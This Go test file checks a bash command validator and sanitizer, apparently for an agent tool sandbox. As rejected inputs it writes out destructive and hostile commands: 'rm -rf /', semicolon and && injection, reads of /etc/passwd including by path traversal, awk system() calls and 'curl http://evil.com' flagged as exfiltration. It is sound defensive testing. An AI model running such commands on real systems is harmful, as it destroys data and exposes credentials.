// ABOUTME: Security tests for bash command validation
// ABOUTME: Tests command injection prevention and dangerous command blocking

package tools

import (
	"testing"
)

func TestValidateBashCommand(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "safe echo command",
			command:     "echo hello world",
			expectError: false,
		},
		{
			name:        "safe ls command",
			command:     "ls -la",
			expectError: false,
		},
		{
			name:        "dangerous rm command",
			command:     "rm -rf /",
			expectError: true,
			errorMsg:    "not allowed",
		},
		{
			name:        "command injection with semicolon",
			command:     "echo hello; rm -rf /",
			expectError: true,
			errorMsg:    "dangerous pattern",
		},
		{
			name:        "command substitution with $(...)",
			command:     "echo $(whoami)",
			expectError: true,
			errorMsg:    "dangerous pattern",
		},
		{
			name:        "command substitution with backticks",
			command:     "echo `id`",
			expectError: true,
			errorMsg:    "dangerous pattern",
		},
		{
			name:        "pipe to dangerous command",
			command:     "cat file.txt | rm",
			expectError: true,
			errorMsg:    "not allowed",
		},
		{
			name:        "access to /etc/passwd",
			command:     "cat /etc/passwd",
			expectError: true,
			errorMsg:    "dangerous pattern",
		},
		{
			name:        "path traversal attempt",
			command:     "cat ../../../etc/passwd",
			expectError: true,
			errorMsg:    "dangerous pattern",
		},
		{
			name:        "sudo command",
			command:     "sudo ls",
			expectError: true,
			errorMsg:    "not allowed",
		},
		{
			name:        "curl command (potential data exfiltration)",
			command:     "curl http://evil.com",
			expectError: true,
			errorMsg:    "not allowed",
		},
		{
			name:        "safe git command",
			command:     "git status",
			expectError: false,
		},
		{
			name:        "safe python command",
			command:     "python -c \"print('hello')\"",
			expectError: false,
		},
		{
			name:        "empty command",
			command:     "",
			expectError: true,
			errorMsg:    "empty command",
		},
		{
			name:        "very long command",
			command:     string(make([]byte, 10001)),
			expectError: true,
			errorMsg:    "too long",
		},
		{
			name:        "find with exec rm (dangerous)",
			command:     "find . -name '*.tmp' -exec rm {} \\;",
			expectError: true,
			errorMsg:    "-exec rm",
		},
		{
			name:        "find with delete (dangerous)",
			command:     "find . -name '*.tmp' -delete",
			expectError: true,
			errorMsg:    "find with -delete",
		},
		{
			name:        "safe find command",
			command:     "find . -name '*.go' -type f",
			expectError: false,
		},
		{
			name:        "sed with in-place editing (dangerous)",
			command:     "sed -i 's/old/new/g' file.txt",
			expectError: true,
			errorMsg:    "sed in-place editing",
		},
		{
			name:        "safe sed command",
			command:     "sed 's/old/new/g' file.txt",
			expectError: false,
		},
		{
			name:        "awk with system() (dangerous)",
			command:     "awk 'BEGIN{system(\"rm -rf /\")}'",
			expectError: true,
			errorMsg:    "system(",
		},
		{
			name:        "safe awk command",
			command:     "awk '{print $1}' file.txt",
			expectError: false,
		},
		{
			name:        "grep /etc directory (restricted)",
			command:     "grep password /etc/passwd",
			expectError: true,
			errorMsg:    "/etc/passwd",
		},
		{
			name:        "safe grep command",
			command:     "grep 'pattern' file.txt",
			expectError: false,
		},
		{
			name:        "command with && chaining (safe commands)",
			command:     "echo hello && echo world",
			expectError: false,
		},
		{
			name:        "command with || chaining (safe commands)",
			command:     "echo hello || echo world",
			expectError: false,
		},
		{
			name:        "redirection to /dev/null",
			command:     "echo data > /dev/null",
			expectError: false,
		},
		{
			name:        "chaining with dangerous command",
			command:     "echo hello && rm -rf /",
			expectError: true,
			errorMsg:    "not allowed",
		},
		{
			name:        "access to proc filesystem",
			command:     "cat /proc/version",
			expectError: true,
			errorMsg:    "dangerous pattern",
		},
		{
			name:        "npm command (safe)",
			command:     "npm --version",
			expectError: false,
		},
		{
			name:        "unknown command not in allowlist",
			command:     "totally-unknown-command",
			expectError: true,
			errorMsg:    "unknown command",
		},
		{
			name:        "safe-looking unknown command",
			command:     "my-tool-version",
			expectError: false, // Should pass heuristic check
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateBashCommand(tt.command)
			
			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error containing %q, but got no error", tt.errorMsg)
					return
				}
				if tt.errorMsg != "" && !containsIgnoreCase(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error containing %q, got: %v", tt.errorMsg, err)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error: %v", err)
				}
			}
		})
	}
}

func TestSanitizeBashCommand(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "normal command",
			input:    "echo hello world",
			expected: "echo hello world",
		},
		{
			name:     "command with null byte",
			input:    "echo hello\x00world",
			expected: "echo helloworld",
		},
		{
			name:     "command with control characters",
			input:    "echo hello\x01\x02world",
			expected: "echo helloworld",
		},
		{
			name:     "command with leading/trailing whitespace",
			input:    "  echo hello  \n",
			expected: "echo hello",
		},
		{
			name:     "command with tabs and newlines",
			input:    "echo\thello\nworld",
			expected: "echo\thello\nworld",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "",
		},
		{
			name:     "only whitespace",
			input:    "   \t\n  ",
			expected: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sanitizeBashCommand(tt.input)
			if result != tt.expected {
				t.Errorf("sanitizeBashCommand(%q) = %q, expected %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestIsShellBuiltin(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{"echo builtin", "echo", true},
		{"cd builtin", "cd", true},
		{"if builtin", "if", true},
		{"for builtin", "for", true},
		{"ls not builtin", "ls", false},
		{"cat not builtin", "cat", false},
		{"test builtin", "test", true},
		{"[ builtin", "[", true},
		{"[[ builtin", "[[", true},
		{"unknown command", "unknown-cmd", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isShellBuiltin(tt.command)
			if result != tt.expected {
				t.Errorf("isShellBuiltin(%q) = %v, expected %v", tt.command, result, tt.expected)
			}
		})
	}
}

func TestLooksLikeSafeCommand(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{"npm prefixed", "npm-install", true},
		{"node prefixed", "node-version", true},
		{"go prefixed", "go-build", true},
		{"version suffixed", "my-tool-version", true},
		{"config suffixed", "app-config", true},
		{"help suffixed", "tool-help", true},
		{"random command", "random-tool", false},
		{"dangerous looking", "evil-delete-all", false},
		{"build suffixed", "make-build", true},
		{"test suffixed", "run-test", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := looksLikeSafeCommand(tt.command)
			if result != tt.expected {
				t.Errorf("looksLikeSafeCommand(%q) = %v, expected %v", tt.command, result, tt.expected)
			}
		})
	}
}

func TestRestrictedEnvironment(t *testing.T) {
	env := restrictedEnvironment()
	
	// Should have at least some basic variables
	if len(env) < 5 {
		t.Errorf("Expected at least 5 environment variables, got %d", len(env))
	}
	
	// Check for required variables
	requiredVars := []string{"PATH=", "HOME=", "USER=", "SHELL="}
	for _, required := range requiredVars {
		found := false
		for _, envVar := range env {
			if containsIgnoreCase(envVar, required) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Required environment variable %q not found in restricted environment", required)
		}
	}
}

// Helper function for case-insensitive substring check
func containsIgnoreCase(s, substr string) bool {
	s = toLowerString(s)
	substr = toLowerString(substr)
	return len(s) >= len(substr) && stringContains(s, substr)
}

func toLowerString(s string) string {
	result := make([]byte, len(s))
	for i, b := range []byte(s) {
		if b >= 'A' && b <= 'Z' {
			result[i] = b + 32
		} else {
			result[i] = b
		}
	}
	return string(result)
}

func stringContains(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}